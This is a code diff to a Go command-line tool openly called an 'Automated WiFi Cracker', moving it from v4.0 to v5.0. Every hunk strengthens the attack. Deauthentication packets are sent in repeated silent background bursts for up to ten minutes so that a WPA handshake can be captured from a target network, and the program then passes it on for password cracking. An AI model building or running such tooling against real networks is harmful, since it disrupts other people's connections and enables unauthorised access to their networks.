@@ -55,7 +55,7 @@ func main() {
 	}
 
 	cyan.Println("=======================================")
-	cyan.Println("    Automated WiFi Cracker CLI v4.0   ")
+	cyan.Println("    Automated WiFi Cracker CLI v5.0   ")
 	cyan.Println("=======================================")
 
 	setupEnvironment()
@@ -99,19 +99,19 @@ func main() {
 
 	capFile := filepath.Join(targetDir, "handshake")
 
-	// New Robust Handshake Capture Logic
+	// New 1-Minute Robust Handshake Capture Logic
 	captureHandshake(target, capFile)
 
-	// Verify if handshake was actually captured
+	// Final verification
 	if !verifyHandshake(capFile) {
-		red.Println("\n[-] CRITICAL ERROR: Handshake NOT captured.")
-		red.Println("[-] Reason: No device reconnected during the attack, or no client was connected to the router.")
-		red.Println("[-] Suggestion: Connect a device to this WiFi manually, then run the script again.")
+		red.Println("\n[-] CRITICAL ERROR: Handshake NOT captured after 1 minute.")
+		red.Println("[-] Reason: No device reconnected, or target router ignores deauth packets.")
+		red.Println("[-] Suggestion: Connect a device to this WiFi and use the internet, then run the script again.")
 		cleanup()
 		os.Exit(1)
 	}
 
-	green.Println("[+] Valid Handshake Captured Successfully!")
+	green.Println("\n[+] Valid Handshake Captured Successfully!")
 	crackPassword(capFile, targetDir)
 	green.Printf("\n[+] All files for '%s' are stored in: %s\n", target.ESSID, targetDir)
 }
@@ -121,7 +121,7 @@ func main() {
 // ==========================================
 
 func captureHandshake(target Network, capFile string) {
-	yellow.Println("\n[*] Starting Handshake Capture (Listening for 40 seconds)...")
+	yellow.Println("\n[*] Starting Handshake Capture (Listening for up to 10 minutes)...")
 
 	cmd := exec.Command("airodump-ng", "-c", target.CH, "--bssid", target.BSSID, "-w", capFile, monIface)
 	cmd.Stdout = nil
@@ -135,24 +135,46 @@ func captureHandshake(target Network, capFile string) {
 
 	time.Sleep(3 * time.Second) // Wait for airodump to lock channel
 
-	// Deauth Loop: Send bursts of deauth to increase chance of catching handshake
-	for i := 1; i <= 3; i++ {
-		yellow.Printf("[*] Sending Deauth Burst %d/3 (5 seconds each)...\n", i)
+	// 10 Minute Loop (40 attempts, 15 seconds each)
+	for i := 1; i <= 40; i++ {
+		yellow.Printf("\n[*] Attempt %d/40: Sending Deauth Burst (Waiting 15s for reconnect)...\n", i)
 
-		deauthArgs := []string{"--deauth", "5", "-a", target.BSSID, monIface}
+		deauthArgs := []string{"--deauth", "10", "-a", target.BSSID, monIface}
 		if target.Client != "" {
 			deauthArgs = append(deauthArgs, "-c", target.Client)
 		} else {
-			yellow.Println("[!] No specific client found. Sending broadcast deauth (might be less effective).")
+			white.Println("[!] No specific client found. Sending broadcast deauth.")
 		}
 
-		runCmd("aireplay-ng", deauthArgs...)
-		time.Sleep(5 * time.Second)
+		// Run deauth silently in background to keep CLI clean
+		deauthCmd := exec.Command("aireplay-ng", deauthArgs...)
+		deauthCmd.Stdout = nil
+		deauthCmd.Stderr = nil
+		deauthCmd.Start()
+
+		// Wait 12 seconds for clients to reconnect and handshake to be captured
+		time.Sleep(12 * time.Second)
+
+		// Kill deauth command if still running
+		if deauthCmd.Process != nil {
+			deauthCmd.Process.Kill()
+			deauthCmd.Wait()
+		}
+
+		// Check if handshake is already captured! If yes, break early.
+		if verifyHandshake(capFile) {
+			green.Println("[+] Handshake detected early! Stopping capture phase.")
+			if cmd.Process != nil {
+				cmd.Process.Kill()
+				cmd.Wait()
+			}
+			return
+		}
+		white.Println("[*] Handshake not found yet. Retrying...")
 	}
 
-	// Wait a final few seconds to ensure the .cap file is written
-	time.Sleep(5 * time.Second)
-
+	// Final wait to ensure file is completely written
+	time.Sleep(3 * time.Second)
 	if cmd.Process != nil {
 		cmd.Process.Kill()
 		cmd.Wait()
@@ -163,6 +185,11 @@ func captureHandshake(target Network, capFile string) {
 func verifyHandshake(capFile string) bool {
 	finalCapFile := capFile + "-01.cap"
 
+	// Check if file exists first
+	if _, err := os.Stat(finalCapFile); os.IsNotExist(err) {
+		return false
+	}
+
 	// Run aircrack-ng without a wordlist just to check if handshake exists
 	cmd := exec.Command("aircrack-ng", finalCapFile)
 	var buf bytes.Buffer
@@ -171,7 +198,6 @@ func verifyHandshake(capFile string) bool {
 	cmd.Run()
 
 	outputStr := buf.String()
-	// Aircrack outputs "1 handshake" if captured, or "0 handshake" if not.
 	return strings.Contains(outputStr, "1 handshake")
 }
 
